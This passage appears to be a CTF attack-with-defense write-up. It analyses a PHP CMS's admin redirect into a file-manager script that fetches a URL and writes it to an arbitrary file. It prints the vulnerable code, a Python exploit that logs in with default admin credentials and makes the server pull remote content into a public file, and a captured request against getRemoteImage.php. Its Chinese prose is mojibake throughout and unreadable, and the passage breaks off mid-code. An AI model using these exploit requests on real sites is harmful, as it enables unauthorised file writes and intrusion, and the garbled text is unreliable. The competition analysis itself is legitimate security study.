href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x61;&#100;&#x6d;&#x69;&#110;&#46;&#99;&#111;&#x6d;">&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x61;&#100;&#x6d;&#x69;&#110;&#46;&#99;&#111;&#x6d;</a>ï¼Œæ‰€ä»¥æˆ‘æ›´å€¾å‘äºå¤§å®¶åº”è¯¥æ˜¯é€šè¿‡å¼±å¯†ç è§£å‡ºæ¥çš„ï¼Œå¦‚æœæ˜¯æ‰‹æ’•é€†å‘çš„webæ‰‹é‚£ä¹Ÿå¤ªå¼ºäº†8orzã€‚</p><p>è‡³äºä¸ºä»€ä¹ˆçŸ¥é“å¯†ç æ˜¯<a href="mailto:&#97;&#100;&#109;&#x69;&#110;&#64;&#97;&#100;&#x6d;&#x69;&#110;&#46;&#x63;&#111;&#109;">&#97;&#100;&#109;&#x69;&#110;&#64;&#97;&#100;&#x6d;&#x69;&#110;&#46;&#x63;&#111;&#109;</a>ï¼Ÿå› ä¸ºå¯¹æ‰‹çš„pocæœ‰å¸¦ä¸Šè¿™ä¸ªdataï¼Œä¾ç„¶èˆ’æœä¸Šè½¦ã€‚</p><p>ç„¶åç™»å½•ä¹‹åæ˜¯æ²¡æœ‰ä¿®æ”¹å¯†ç åŠŸèƒ½çš„ï¼Œæ‰€ä»¥æƒ³é€šè¿‡ä¿®æ”¹å¯†ç é˜²å®ˆæ˜¯ä¸å¤ªè¡Œçš„ã€‚</p><p>æ¥ä¸‹æ¥çš„è¿½è¸ªå¯¹æˆ‘æ¥è¯´æ˜¯å™©æ¢¦ï¼Œåœ¨å½“æ—¶æˆ‘ä»¬å°±æ²¡æœ‰è¿½è¸ªå‡ºæ¥ï¼Œç”±äºå¯¹è¿™ä¸ªæ¡†æ¶æ•´ä¸ªè°ƒç”¨æµç¨‹éƒ½å¾ˆé™Œç”Ÿï¼Œéƒ½æ˜¯ä¸€æ­¥æ­¥æ…¢æ…¢æ‘¸ç´¢çš„ï¼Œæˆ‘ä»¬å†æ¥å›å¤´çœ‹è¿™ä¸ªè·¯ç”±</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin?redirect=/filemanager/edit/img?file=/homepage/photo1.jpg&amp;url=http:<span class="comment">//flagserver.top/index.php?token=&#123;token&#125;</span></span><br></pre></td></tr></table></figure><p>å½“æ—¶æ²¡æœ‰å…·ä½“çš„åšæ¡†æ¶è·¯ç”±åˆ†æï¼ˆçœŸçš„è¡€äºï¼Œä½†ä¹Ÿæ˜¯çœŸçš„æ²¡æ—¶é—´ï¼Œèƒ½ç°åœºæŒ–æ´çš„å¸ˆå‚…è¾£æ˜¯çœŸæ»´ç‰›çš®ï¼‰ï¼Œå½“æ—¶åªèƒ½æ ¹æ®MVCæ¡†æ¶åšä¸ªå¤§æ¦‚çš„åˆ†æï¼Œå¤§æ¦‚åˆæ­¥æ¨æµ‹æ˜¯åœ¨adminçš„æ¨¡æ¿ä¸‹é€šè¿‡redirecté‡å®šå‘åˆ°filemanageræ¨¡æ¿çš„editæ§åˆ¶å™¨ä¸‹çš„imgå‡½æ•°ï¼Œé€šè¿‡ä¼ å…¥fileæ¥è·å¾—ä¸€ä¸ªæ–‡ä»¶å¹¶ä¸”è°ƒç”¨file_get_contentsï¼Œä¼ å…¥å‚æ•°urlè¿›è¡Œé‡å†™æ–‡ä»¶ã€‚</p><p>äºæ˜¯æˆ‘é‡åˆ°çš„é—®é¢˜å°±æ˜¯&#x2F;filemanager&#x2F;edit&#x2F;imgçš„è·¯ç”±åˆ°åº•åœ¨å“ªé‡Œï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼Œä»¥åŠä¸ºä»€ä¹ˆåœ¨æ¨¡æ¿ä¸‹å°±å¯ä»¥é‡å®šå‘ã€‚äºæ˜¯èµ›åé‡æ–°åˆ†æï¼Œä¸‹é¢æ­£å„¿å…«ç»çš„ç½‘ç«™æ¡†æ¶MVCåˆ†æï¼ˆç”±äºæ˜¯å®Œå…¨é€†ç€åˆ†æçš„ï¼Œæˆ‘æ„Ÿè§‰éƒ¨åˆ†è¿˜æ˜¯æœ‰é”™ï¼Œæœ‰ä»€ä¹ˆé”™è¯¯çš„åœ°æ–¹æ³è¯·å¸ˆå‚…ä»¬æŒ‡å‡ºï¼Œæ¬¢è¿ä¸€èµ·æ¢è®¨ï¼‰ï¼š</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç½‘ç«™appä¸‹çš„æ–‡ä»¶å¤¹ç›®å½•æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://oatmeal.vip/wp-content/uploads/2021/07/image-27.png"></p><p>çœ‹ä¸Šé¢è¯·æ±‚çš„è·¯ç”±ï¼Œå…¶ä¸­&#x2F;adminå’Œ&#x2F;filemanageréƒ½æ¬£ç„¶åœ¨åˆ—ï¼Œæ‰€ä»¥æˆ‘å§‘ä¸”è®¤å®šè¿™äº›æ–‡ä»¶å¤¹æ˜¯å¤šç”¨æˆ·appç›®å½•æˆ–è€…æ˜¯æ¨¡å—ã€‚é‚£ä¸‹é¢çš„å€¼æ€ä¹ˆè°ƒç”¨ï¼Œä¾‹å¦‚adminå¦‚ä½•è¯·æ±‚é‡å®šå‘ï¼Œä»¥åŠ&#x2F;edit&#x2F;imgçš„è°ƒç”¨æ–¹å¼æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹æ‰€æœ‰æ¨¡å—ä¸‹çš„ç»“æ„ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://oatmeal.vip/wp-content/uploads/2021/07/image-28.png"></p><p>å…¶ä»–æš‚ä¸”ä¸è¡¨ï¼Œæ–‡ä»¶å¤¹models&#x2F;views&#x2F;handlersç»„æˆäº†å¤§å®¶ç†Ÿæ‚‰çš„MVCæ¶æ„ï¼Œä½†æ˜¯ä½œä¸ºä¸€ä¸ªæ¨¡å—ï¼Œ&#x2F;adminåˆæ˜¯å¦‚ä½•ä¼ å‚çš„ï¼Ÿè¿™é‡Œå°±è¯´ä¸é€šäº†ï¼Œäºæ˜¯å¤§èƒ†çŒœæµ‹ï¼ŒçœŸæ­£çš„è·¯ç”±æ˜¯&#x2F;admin&#x2F;indexï¼Œç”±äºè°ƒç”¨çš„æ˜¯é»˜è®¤çš„æ§åˆ¶å™¨ï¼Œæ‰€ä»¥è¢«çœç•¥äº†ï¼è·Ÿè¿›index.phpï¼Œå¯ä»¥çœ‹åˆ°ç†Ÿæ‚‰çš„$redirectï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;redirect&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›è¿™ä¸ªå‚æ•°ï¼Œå®ƒåœ¨è¿™é‡Œè¿›å…¥äº†ä¸€ä¸ªcheckï¼Œç”±äºå­˜åœ¨è¿™ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹Validator::validateåšäº†ä»€ä¹ˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;redirect&#x27;</span>])</span><br><span class="line">|| <span class="keyword">empty</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;redirect&#x27;</span>])</span><br><span class="line">|| ! <span class="title class_">Validator</span>::<span class="variable constant_">validate</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;redirect&#x27;</span>], <span class="string">&#x27;header&#x27;</span>)</span><br><span class="line">|| ! <span class="title class_">Validator</span>::<span class="variable constant_">validate</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;redirect&#x27;</span>], <span class="string">&#x27;localpath&#x27;</span>)</span><br><span class="line">) &#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;redirect&#x27;</span>] = <span class="variable">$appconf</span>[<span class="string">&#x27;General&#x27;</span>][<span class="string">&#x27;login_redirect&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">... </span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;header&#x27;</span>:</span><br><span class="line">    <span class="keyword">return</span> ! (<span class="keyword">bool</span>) <span class="title function_ invoke__">preg_match</span> (<span class="string">&#x27;/[\r\n]/s&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;localpath&#x27;</span>:</span><br><span class="line"><span class="variable">$filtered</span> = <span class="title function_ invoke__">filter_var</span> (<span class="variable">$value</span>, FILTER_SANITIZE_URL);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$filtered</span> !== <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">filter_var</span> (<span class="variable">$value</span>, FILTER_SANITIZE_URL);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$value</span> === <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span> (<span class="string">&#x27;|^/[^/]|&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªåˆ æ‰äº†\r\nï¼Œç¬¬äºŒä¸ªé™å®šäº†è¯·æ±‚çš„é‡å®šå‘çš„ç›®å½•å¿…é¡»æ˜¯æœ¬åœ°è·¯å¾„ï¼Œè€Œä¸æ˜¯å…¶ä»–ç½‘ç«™ï¼Œé™åˆ¶äº†ä¸€ä¸‹é‡å®šå‘æ”»å‡»ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬æäº¤çš„payloadä¸ºredirect&#x3D;&#x2F;filemanager&#x2F;edit&#x2F;imgï¼Œå³é‡å®šå‘åˆ°äº†&#x2F;filemanagerä¸‹çš„â€¦â€¦ä¸‹çš„ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>ç»éªŒå‘Šè¯‰æˆ‘ï¼Œä¼šé‡å®šå‘åˆ°filemanagerä¸‹çš„handlersä¸‹çš„edit.phpï¼Œå¹¶ä¸”è°ƒç”¨ä¸‹é¢imgæ–¹æ³•ï¼Œå¹¶ä¸”æ¯”èµ›ä¸­æˆ‘å°±æ˜¯è¿™ä¹ˆè®¤ä¸ºå®ç°çš„ï¼Œä½†æ˜¯è¿›å…¥edit.phpï¼Œä¼šå‘ç°å…¶å®å¹¶æ²¡æœ‰img()è¿™ä¸ªæ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘åˆšå¼€å§‹æ‰“æ¯”èµ›çš„æ—¶å€™æœç´¢å…¨å±€å‡½æ•°æ²¡æœ‰æœåˆ°imgæœ€åä¹Ÿæ²¡æœ‰patchä¸Šçš„åŸå› ã€‚è¿™é‡Œçš„ç›®å½•æ˜¯è¿™æ ·å­çš„ï¼š</p><p><img src="https://oatmeal.vip/wp-content/uploads/2021/07/image-29.png"></p><p>è¿™é‡Œå¯ä»¥çœ‹å‡ºå·®åˆ«ï¼Œå…¶å®æˆ‘ä»¬å¹¶ä¸æ˜¯è¿›å…¥äº†editæ§åˆ¶å™¨è°ƒç”¨imgå‡½æ•°ï¼Œè€Œæ˜¯è¿›å…¥äº†editç›®å½•ä¸‹çš„img.phpï¼ç»“åˆä¸Šé¢&#x2F;admin&#x2F;indexè¿™æ ·çš„è·¯ç”±ï¼Œè¿™æ ·çš„æ¨æµ‹å…¶å®æ˜¯æ­£ç¡®çš„ï¼Œæˆ‘ä»¬å®é™…ä¸Šåªæ˜¯è°ƒç”¨äº†img.phpï¼Œå¹¶æ²¡æœ‰è°ƒç”¨å…¶ä¸­çš„ä»»ä½•å‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›img.phpè¿›è¡Œcheckï¼Œæ¯ä¸€æ­¥å‘ç”Ÿä»€ä¹ˆæˆ‘éƒ½æ ¹æ®æˆ‘çš„ç†è§£è¿›è¡Œäº†æ³¨é‡Šã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Save the changes from Aviary for an image.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">require_admin</span> ();</span><br><span class="line"><span class="variable">$page</span>-&gt;layout = <span class="literal">false</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123; <span class="comment">// æ˜¯å¦æäº¤äº†fileå‚æ•°</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span> (<span class="keyword">array</span> (</span><br><span class="line"><span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">__</span> (<span class="string">&#x27;No file specified.&#x27;</span>)</span><br><span class="line">));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="title class_">FileManager</span>::<span class="variable constant_">verify_file</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123; <span class="comment">// éªŒè¯æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span> (<span class="keyword">array</span> (</span><br><span class="line"><span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">__</span> (<span class="string">&#x27;Invalid file.&#x27;</span>)</span><br><span class="line">));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123; <span class="comment">// éªŒè¯æ˜¯å¦GETå­˜åœ¨$urlå‚æ•°</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span> (<span class="keyword">array</span> (</span><br><span class="line"><span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">__</span> (<span class="string">&#x27;No image url specified.&#x27;</span>)</span><br><span class="line">));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">fetch_url</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (! <span class="variable">$res</span>) &#123; <span class="comment">// URLæ˜¯å¦èƒ½è¿›è¡Œæ­£å¸¸è§£æ</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span> (<span class="keyword">array</span> (</span><br><span class="line"><span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">__</span> (<span class="string">&#x27;Updated image not found.&#x27;</span>)</span><br><span class="line">));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="title function_ invoke__">file_put_contents</span> (<span class="title function_ invoke__">conf</span>(<span class="string">&#x27;Paths&#x27;</span>,<span class="string">&#x27;filemanager_path&#x27;</span>) . <span class="string">&#x27;/&#x27;</span>  . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>], <span class="variable">$res</span>)) &#123; <span class="comment">// æœ€ç»ˆå°†urlè¯·æ±‚çš„å‚æ•°å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span> (<span class="keyword">array</span> (</span><br><span class="line"><span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">__</span> (<span class="string">&#x27;Unable to write to the file. Please check your folder permissions and try again.&#x27;</span>)</span><br><span class="line">));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span> (<span class="keyword">array</span> (</span><br><span class="line"><span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"><span class="string">&#x27;data&#x27;</span> =&gt; <span class="title function_ invoke__">__</span> (<span class="string">&#x27;File saved.&#x27;</span>)</span><br><span class="line">)); </span><br></pre></td></tr></table></figure><p>è¿™æ ·å‘ç”Ÿä»€ä¹ˆå°±å¾ˆæ¸…æ¥šäº†ï¼Œä»&#x2F;adminæ¨¡å—çš„indexæ§åˆ¶å™¨é‡å®šå‘åˆ°&#x2F;filemanageræ¨¡å—ä¸‹çš„&#x2F;edit&#x2F;imgæ§åˆ¶å™¨å¹¶ä¸”é€šè¿‡äº†urlå†™å…¥æ–‡ä»¶flagï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘åˆšå¼€å§‹è¯·æ±‚å›¾ç‰‡æ–‡ä»¶ä¸‹é©¬è·å¾—çš„flagéƒ½ä¼šæŠ¥é”™ï¼Œå› ä¸ºæˆ‘æ‹¿åˆ°çš„æ˜¯åˆ«çš„é˜Ÿä¼çš„tokençš„flagã€‚å¦‚æœå¤šä¸ªé˜Ÿä¼åŒæ—¶è¯·æ±‚ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œä½ ç”šè‡³è¿˜éœ€è¦è·Ÿä»–ä»¬æ¡ä»¶ç«äº‰ã€‚</p><p>æœ€ç»ˆexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// ä¸¤ä¸ªéƒ½è¡Œ</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp4</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp4 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># é»‘åå•æ£€æµ‹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp4.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># è¯·æ±‚</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;redirect&quot;</span>: <span class="string">f&quot;/filemanager/edit/img?file=/homepage/photo4.jpg&amp;url=http://flagserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin@admin.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin@admin.com&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    exp4.request(url=ip + <span class="string">&quot;admin&quot;</span>, method=<span class="string">&quot;POST&quot;</span>, data=data)</span><br><span class="line">    res = exp4.request(url=ip +<span class="string">&quot;files/homepage/photo4.jpg&quot;</span>, method=<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    <span class="comment"># æäº¤ flag</span></span><br><span class="line">    exp4.submit(res=res, pid=pid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp5</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp5 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># é»‘åå•æ£€æµ‹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp5.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># è¯·æ±‚</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin@admin.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin@admin.com&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;redirect&quot;</span>: <span class="string">f&quot;/filemanager/edit/img?file=/homepage/photo1.jpg&amp;url=http://flagserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    exp5.request(url=ip + <span class="string">&quot;admin&quot;</span>, method=<span class="string">&quot;POST&quot;</span>, params=params, data=data)</span><br><span class="line">    res = exp5.request(url=ip +<span class="string">&quot;files/homepage/photo1.jpg&quot;</span>, method=<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    <span class="comment"># æäº¤ flag</span></span><br><span class="line">    exp5.submit(res=res, pid=pid)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªexpå¤§æ¦‚æ˜¯åœ¨ä¸¤ç‚¹å†™å¥½çš„ï¼Œé‚£ä¸ªæ—¶å€™æˆ‘ä»¬å¤§æ¦‚æ‰åˆ°äº”å…­åäº†ï¼Ÿäº¤äº†ä¹‹åå’Œpwnçˆ·çˆ·ä»¬åˆæŠŠåˆ†æ•°é¡½å¼ºçš„æ‹‰å›å»äº†ä¸€ç‚¹ï¼Œè¿™ä¸ªæ—¶å€™çˆ·çˆ·ä»¬å·²ç»åœ¨çœ‹å¯ä¿¡è®¡ç®—äº†ï¼Œç¬¬ä¸‰ä¸ªWebæ˜¯Web3ï¼Œå½“æ—¶å·²ç»æ”¾å‡ºè€Œä¸”è¢«æ‹¿ä¸€è¡€äº†ã€‚å½“æ—¶æˆ‘è®©è¿ç»´å¸ˆå‚…å»ä¿®æ´ï¼Œä½†æ˜¯åè€ŒæŠŠé¶æœºå¼„å®•æœºäº†ï¼Œæ‰€ä»¥æˆ‘åˆç¡¬ç€å¤´çš®å»ä¿®æ´äº†ï¼Œå¸ˆå‚…å»çœ‹Web3çš„æ—¥å¿—äº†ã€‚ç”±äºå½“æ—¶æ²¡æœ‰åˆ†æåˆ°æ´ï¼Œçå‡ æŠŠpatchæˆ‘ä»¬æœ€ç»ˆæ²¡patchä¸Šï¼Œæœ€ååˆå»çœ‹Web3çš„æµé‡åˆ†æäº†ï¼Œæœ€åä¸‰ç‚¹å·¦å³å†™å¥½äº†Web3çš„expï¼Œç¦»æ¯”èµ›ç»“æŸå‰©ä¸‹ä¸¤å°æ—¶å·¦å³ï¼Œè¿™é‡Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´ï¼ŒWebèƒŒå¤§é”…ã€‚</p><p>Web3è¿™é“é¢˜æ¯”è¾ƒæœ‰æ„æ€ï¼Œå®ƒæ§åˆ¶æƒé™ä¸èƒ½å†™å…¥ä¸æ­»é©¬ï¼Œä½†æ˜¯ç”±äºè¿™é“é¢˜æ˜¯å¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„ï¼Œå®ƒæˆä¸ºäº†å”¯ä¸€ä¸€é“ï¼ˆè‡³å°‘åœ¨æˆ‘çœ‹åˆ°çš„ï¼‰èƒ½å†™å…¥é©¬çš„é¢˜ç›®ï¼Œäºæ˜¯æœ‰å¾ˆå¤šé˜Ÿä¼åœ¨è¿™é“é¢˜å†™é©¬ï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰åšå¥½åŠ å¯†ï¼Œæœ€ååè€Œè¢«æˆ‘ç”¨ä¸Šäº†ï¼Œåé¢å†æã€‚ç”±äºè¿™é“é¢˜è¢«æŸåªé˜Ÿä¼æ‰“å…¨åœºäº†ï¼Œæ‰€ä»¥å°±ç®—æˆ‘ä»¬æ²¡patchä»–ä¹Ÿå®•æœºäº†ï¼Œæˆ‘è·Ÿå·¥ä½œäººå‘˜åé¦ˆåä¹Ÿæ²¡æœ‰è¡¥åˆ†æ•°ï¼Œå®•æœºäº†æŒºä¹…ï¼Œè¡€äºã€‚</p><p>å½“æ—¶æµé‡åŒ…æŠ“åˆ°çš„expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /getRemoteImage.php?upfile=http:<span class="comment">//flagserver.top/index.php?token=xxxxxx%26123=aurora.gif</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªexpå†™èµ·æ¥å…¶å®ç‰¹åˆ«çš„ç®€å•ï¼Œåªæœ‰ç®€å•çš„è¯·æ±‚ï¼Œå½“æ—¶å¾ˆå¿«å°±å†™å¥½äº†ï¼Œä½†æ˜¯ç”±äºæ˜¯èµ›ååˆ†æï¼Œæˆ‘è¿˜æ˜¯åˆ†æä¸€ä¸‹æ¼æ´çš„æˆå› å’Œå…·ä½“è·¯ç”±çš„èµ°å‘å§ã€‚</p><p><img src="https://oatmeal.vip/wp-content/uploads/2021/07/16266289581.png"></p><p>è¿›å…¥è¯¥æ–‡ä»¶ï¼Œè¿½è¸ªupfile</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uri</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upfile&#x27;</span>]);</span><br><span class="line"><span 